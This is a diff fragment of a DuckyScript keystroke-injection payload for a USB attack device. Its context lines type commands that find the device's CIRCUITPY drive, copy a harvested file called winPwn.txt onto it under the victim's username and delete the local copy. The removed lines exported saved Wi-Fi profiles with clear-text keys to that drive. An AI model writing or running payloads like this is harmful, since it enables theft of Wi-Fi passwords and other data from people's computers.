@@ -40,8 +40,6 @@ DELAY 950
 STRING for /f "tokens=3" %a in ('"wmic logicaldisk where drivetype=2 get deviceid, volumename, description" ^| findstr CIRCUITPY'); do copy winPwn.txt %a\%USERNAME%\%USERNAME%.txt /y
 ENTER
 DELAY 600
-STRING for /f "tokens=3" %a in ('"wmic logicaldisk where drivetype=2 get deviceid, volumename, description" ^| findstr CIRCUITPY'); do netsh wlan export profile folder=%a\%USERNAME% key="clear"
-REM move winPwn.txt D:\winPwn.txt 
 ENTER
 DELAY 2500
 STRING del winPwn.txt
